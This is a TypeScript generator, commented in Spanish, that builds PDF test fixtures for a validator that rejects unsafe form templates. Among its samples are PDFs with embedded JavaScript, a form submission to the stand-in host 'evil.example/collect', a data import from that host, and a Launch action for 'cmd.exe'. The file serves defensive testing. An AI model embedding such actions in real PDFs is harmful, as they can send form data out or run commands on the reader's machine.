import { mkdir, writeFile } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { PDFDocument, PDFHexString, PDFName, PDFString, StandardFonts, type PDFPage } from 'pdf-lib'

/**
 * Generador DETERMINISTA de las fixtures PDF de la revisión estructural
 * (USRH1789097550387). Todo se construye en memoria solo con `pdf-lib`: no
 * hace falta `qpdf` ni ningún binario preexistente, y por convención del
 * repositorio no se comitea ningún `.pdf` bajo `tests/`.
 *
 * Determinismo: fechas fijas (pdf-lib estampa creación y modificación con la
 * hora actual si no se fijan), `useObjectStreams: false` y cero
 * `Math.random()`/`Date.now()`. Dos corridas producen bytes idénticos; lo
 * vigila el spec unitario.
 *
 * Modo `--write` (opcional, para inspeccionar los archivos a mano):
 *   node --import=ts-node/esm tests/fixtures/pdf-templates/build_pdf_template_fixtures.ts --write [directorio]
 */

/** Fecha fija de todas las fixtures. */
export const FIXTURE_FIXED_DATE = new Date('2026-01-01T00:00:00.000Z')

const SAVE_OPTIONS = { useObjectStreams: false } as const
const PAGE_SIZE: [number, number] = [400, 300]
const FIELD_WIDTH = 300
const FIELD_HEIGHT = 24

/** Acciones de widget que la revisión rechaza; el nombre es el `/S` del PDF. */
export const WIDGET_ACTION_KINDS = [
  'SubmitForm',
  'ImportData',
  'Launch',
  'GoToR',
  'JavaScript',
] as const
export type WidgetActionKind = (typeof WIDGET_ACTION_KINDS)[number]

/** Los cinco campos de texto de la plantilla válida (nombres del catálogo). */
export const VALID_TEMPLATE_FIELD_NAMES = [
  'legal_name',
  'employee_name',
  'position_name',
  'hire_date',
  'separation_date',
] as const

async function newDocument(): Promise<PDFDocument> {
  const document = await PDFDocument.create({ updateMetadata: false })
  document.setProducer('fixture')
  document.setCreator('fixture')
  document.setCreationDate(FIXTURE_FIXED_DATE)
  document.setModificationDate(FIXTURE_FIXED_DATE)
  return document
}

async function toBuffer(document: PDFDocument): Promise<Buffer> {
  return Buffer.from(await document.save(SAVE_OPTIONS))
}

function addTextField(document: PDFDocument, page: PDFPage, name: string, y: number): void {
  document
    .getForm()
    .createTextField(name)
    .addToPage(page, { x: 20, y, width: FIELD_WIDTH, height: FIELD_HEIGHT })
}

function javascriptAction(document: PDFDocument, script: string) {
  return document.context.obj({ S: 'JavaScript', JS: PDFString.of(script) })
}

function widgetAction(document: PDFDocument, kind: WidgetActionKind) {
  switch (kind) {
    case 'SubmitForm':
      return document.context.obj({
        S: 'SubmitForm',
        F: PDFString.of('https://evil.example/collect'),
        Flags: 4,
      })
    case 'ImportData':
      return document.context.obj({
        S: 'ImportData',
        F: PDFString.of('https://evil.example/data.fdf'),
      })
    case 'Launch':
      return document.context.obj({ S: 'Launch', F: PDFString.of('cmd.exe') })
    case 'GoToR':
      return document.context.obj({ S: 'GoToR', F: PDFString.of('other.pdf'), D: [0, 'Fit'] })
    case 'JavaScript':
      return javascriptAction(document, 'app.alert(5)')
  }
}

/** Documento base con un solo campo de texto `employee_name`. */
async function singleFieldDocument() {
  const document = await newDocument()
  const page = document.addPage(PAGE_SIZE)
  const font = await document.embedFont(StandardFonts.Helvetica)
  const field = document.getForm().createTextField('employee_name')
  field.addToPage(page, { x: 20, y: 100, width: FIELD_WIDTH, height: FIELD_HEIGHT, font })
  return { document, field }
}

/** `no-fields.pdf`: una página con texto y ningún campo (ni siquiera AcroForm). */
export async function buildNoFields(): Promise<Buffer> {
  const document = await newDocument()
  const page = document.addPage(PAGE_SIZE)
  const font = await document.embedFont(StandardFonts.Helvetica)
  page.drawText('Constancia sin huecos', { x: 20, y: 250, size: 14, font })
  return toBuffer(document)
}

/** `with-openaction.pdf`: `/OpenAction` con JavaScript en el catálogo. */
export async function buildWithOpenAction(): Promise<Buffer> {
  const { document } = await singleFieldDocument()
  document.catalog.set(PDFName.of('OpenAction'), javascriptAction(document, 'app.alert(1)'))
  return toBuffer(document)
}

/** `with-aa.pdf`: `/AA` (acciones adicionales) en el catálogo. */
export async function buildWithCatalogAdditionalActions(): Promise<Buffer> {
  const { document } = await singleFieldDocument()
  document.catalog.set(
    PDFName.of('AA'),
    document.context.obj({ WC: javascriptAction(document, 'app.alert(2)') })
  )
  return toBuffer(document)
}

/** `with-javascript.pdf`: árbol de nombres `/Names → /JavaScript`. */
export async function buildWithJavascriptNameTree(): Promise<Buffer> {
  const { document } = await singleFieldDocument()
  const actionRef = document.context.register(javascriptAction(document, 'app.alert(3)'))
  const tree = document.context.obj({ Names: [PDFString.of('init'), actionRef] })
  document.catalog.set(PDFName.of('Names'), document.context.obj({ JavaScript: tree }))
  return toBuffer(document)
}

/** `with-embedded-file.pdf`: archivo adjunto (`/Names → /EmbeddedFiles`). */
export async function buildWithEmbeddedFile(): Promise<Buffer> {
  const { document } = await singleFieldDocument()
  await document.attach(new TextEncoder().encode('payload'), 'payload.txt', {
    mimeType: 'text/plain',
    description: 'fixture',
    creationDate: FIXTURE_FIXED_DATE,
    modificationDate: FIXTURE_FIXED_DATE,
  })
  return toBuffer(document)
}

/** `submitform.pdf` y variantes: acción `/A` en el widget de `employee_name`. */
export async function buildWithWidgetAction(kind: WidgetActionKind): Promise<Buffer> {
  const { document, field } = await singleFieldDocument()
  for (const widget of field.acroField.getWidgets()) {
    widget.dict.set(PDFName.of('A'), widgetAction(document, kind))
  }
  return toBuffer(document)
}

/** Acciones `/AA` en el widget (disparadores `/Fo` y `/K`). */
export async function buildWithWidgetAdditionalActions(): Promise<Buffer> {
  const { document, field } = await singleFieldDocument()
  for (const widget of field.acroField.getWidgets()) {
    widget.dict.set(
      PDFName.of('AA'),
      document.context.obj({
        Fo: widgetAction(document, 'SubmitForm'),
        K: javascriptAction(document, 'AFNumber_Keystroke()'),
      })
    )
  }
  return toBuffer(document)
}

/** Acción `/AA → /V` en el diccionario del CAMPO, no del widget. */
export async function buildWithFieldAdditionalActions(): Promise<Buffer> {
  const { document, field } = await singleFieldDocument()
  field.acroField.dict.set(
    PDFName.of('AA'),
    document.context.obj({ V: javascriptAction(document, 'app.alert(9)') })
  )
  return toBuffer(document)
}

/** `xfa.pdf`: AcroForm con un campo y la entrada `/XFA`. */
export async function buildXfa(): Promise<Buffer> {
  const document = await newDocument()
  const page = document.addPage(PAGE_SIZE)
  addTextField(document, page, 'x', 100)
  const xml = '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template/></xdp:xdp>'
  const streamRef = document.context.register(document.context.flateStream(xml))
  document
    .getForm()
    .acroForm.dict.set(
      PDFName.of('XFA'),
      document.context.obj([PDFString.of('xdp:xdp'), streamRef])
    )
  return Buffer.from(await document.save({ ...SAVE_OPTIONS, updateFieldAppearances: false }))
}

/** `bidi-field-name.pdf`: campo llamado U+202E + "raro". */
export async function buildBidiFieldName(): Promise<Buffer> {
  const document = await newDocument()
  const page = document.addPage(PAGE_SIZE)
  addTextField(document, page, '\u202Eraro', 100)
  return toBuffer(document)
}

/** Campo con un control C0 en el nombre ("a" + U+0007 + "b"). */
export async function buildControlCharFieldName(): Promise<Buffer> {
  const document = await newDocument()
  const page = document.addPage(PAGE_SIZE)
  addTextField(document, page, 'a\u0007b', 100)
  return toBuffer(document)
}

/** `duplicate-field-different-type.pdf`: dos campos `folio`, uno de texto y una casilla. */
export async function buildDuplicateFieldDifferentType(): Promise<Buffer> {
  const document = await newDocument()
  const page = document.addPage(PAGE_SIZE)
  const form = document.getForm()
  addTextField(document, page, 'folio', 140)
  const checkbox = form.createCheckBox('folio__tmp')
  checkbox.addToPage(page, { x: 20, y: 60, width: 20, height: 20 })
  // Renombrar tras crear esquiva el candado de nombres de pdf-lib
  checkbox.acroField.setPartialName('folio')
  return toBuffer(document)
}

/** Caso LEGÍTIMO: un solo campo `employee_name` pintado en tres widgets de dos páginas. */
export async function buildMultiWidgetField(): Promise<Buffer> {
  const document = await newDocument()
  const first = document.addPage(PAGE_SIZE)
  const second = document.addPage(PAGE_SIZE)
  const field = document.getForm().createTextField('employee_name')
  field.addToPage(first, { x: 20, y: 100, width: FIELD_WIDTH, height: FIELD_HEIGHT })
  field.addToPage(second, { x: 20, y: 100, width: FIELD_WIDTH, height: FIELD_HEIGHT })
  field.addToPage(first, { x: 20, y: 40, width: FIELD_WIDTH, height: FIELD_HEIGHT })
  return toBuffer(document)
}

/** `signature-field.pdf`: campo `/FT /Sig` armado a mano junto a un campo de texto. */
export async function buildSignatureField(name = 'firma'): Promise<Buffer> {
  const document = await newDocument()
  const page = document.addPage(PAGE_SIZE)
  const form = document.getForm()
  addTextField(document, page, 'employee_name', 140)
  const signature = document.context.obj({
    Type: 'Annot',
    Subtype: 'Widget',
    FT: 'Sig',
    T: PDFString.of(name),
    Rect: [20, 40, 220, 90],
    P: page.ref,
    F: 4,
  })
  const signatureRef = document.context.register(signature)
  form.acroForm.addField(signatureRef)
  page.node.addAnnot(signatureRef)
  return toBuffer(document)
}

/** `checkbox-named-employee-name.pdf`: una casilla con el nombre de un campo del catálogo. */
export async function buildCheckboxNamedEmployeeName(): Promise<Buffer> {
  const document = await newDocument()
  const page = document.addPage(PAGE_SIZE)
  document
    .getForm()
    .createCheckBox('employee_name')
    .addToPage(page, { x: 20, y: 100, width: 20, height: 20 })
  return toBuffer(document)
}

/** `30-plus-pages.pdf` (31 páginas, 201 campos) o el límite que sí pasa (30, 200). */
export async function buildManyPagesAndFields(pages = 31, totalFields = 201): Promise<Buffer> {
  const document = await newDocument()
  const form = document.getForm()
  let created = 0
  for (let pageIndex = 0; pageIndex < pages; pageIndex++) {
    const page = document.addPage([400, 600])
    const perPage = Math.ceil((totalFields - created) / (pages - pageIndex))
    for (let slot = 0; slot < perPage && created < totalFields; slot++, created++) {
      form
        .createTextField(`field_${String(created).padStart(3, '0')}`)
        .addToPage(page, { x: 20, y: 560 - slot * 40, width: FIELD_WIDTH, height: FIELD_HEIGHT })
    }
  }
  return toBuffer(document)
}

/** `valid-template.pdf`: cinco campos de texto con nombres del catálogo, una página, sin contenido activo. */
export async function buildValidTemplate(): Promise<Buffer> {
  const document = await newDocument()
  const page = document.addPage(PAGE_SIZE)
  const font = await document.embedFont(StandardFonts.Helvetica)
  page.drawText('Plantilla válida', { x: 20, y: 270, size: 14, font })
  VALID_TEMPLATE_FIELD_NAMES.forEach((name, index) => {
    addTextField(document, page, name, 230 - index * 40)
  })
  return toBuffer(document)
}

/** `encrypted.pdf`: entrada `/Encrypt` en el trailer (pdf-lib solo mira su presencia). */
export async function buildEncrypted(): Promise<Buffer> {
  const { document } = await singleFieldDocument()
  const encrypt = document.context.obj({
    Filter: PDFName.of('Standard'),
    V: 1,
    R: 2,
    Length: 40,
    P: -1,
    O: PDFHexString.of('00'.repeat(32)),
    U: PDFHexString.of('00'.repeat(32)),
  })
  document.context.trailerInfo.Encrypt = document.context.register(encrypt)
  return toBuffer(document)
}

/** Las trece fixtures nombradas del spec, más las auxiliares de las pruebas. */
export const PDF_TEMPLATE_FIXTURES: Readonly<Record<string, () => Promise<Buffer>>> = {
  'no-fields.pdf': buildNoFields,
  'with-openaction.pdf': buildWithOpenAction,
  'with-aa.pdf': buildWithCatalogAdditionalActions,
  'with-javascript.pdf': buildWithJavascriptNameTree,
  'with-embedded-file.pdf': buildWithEmbeddedFile,
  'submitform.pdf': () => buildWithWidgetAction('SubmitForm'),
  'xfa.pdf': buildXfa,
  'bidi-field-name.pdf': buildBidiFieldName,
  'duplicate-field-different-type.pdf': buildDuplicateFieldDifferentType,
  '30-plus-pages.pdf': () => buildManyPagesAndFields(),
  'valid-template.pdf': buildValidTemplate,
  'checkbox-named-employee-name.pdf': buildCheckboxNamedEmployeeName,
  'encrypted.pdf': buildEncrypted,
  'signature-field.pdf': () => buildSignatureField(),
  'multi-widget-field.pdf': buildMultiWidgetField,
  'control-char-field-name.pdf': buildControlCharFieldName,
  'widget-aa-submitform.pdf': buildWithWidgetAdditionalActions,
  'field-aa-javascript.pdf': buildWithFieldAdditionalActions,
}

/** Escribe todas las fixtures en `directory` y devuelve las rutas creadas. */
export async function writePdfTemplateFixtures(directory: string): Promise<string[]> {
  await mkdir(directory, { recursive: true })
  const written: string[] = []
  for (const [name, build] of Object.entries(PDF_TEMPLATE_FIXTURES)) {
    const target = path.join(directory, name)
    await writeFile(target, await build())
    written.push(target)
  }
  return written
}

const writeFlag = process.argv.indexOf('--write')
if (writeFlag !== -1) {
  const directory =
    process.argv[writeFlag + 1] ?? path.join(path.dirname(fileURLToPath(import.meta.url)), 'out')
  const written = await writePdfTemplateFixtures(directory)
  process.stdout.write(`${written.length} fixtures escritas en ${directory}\n`)
}
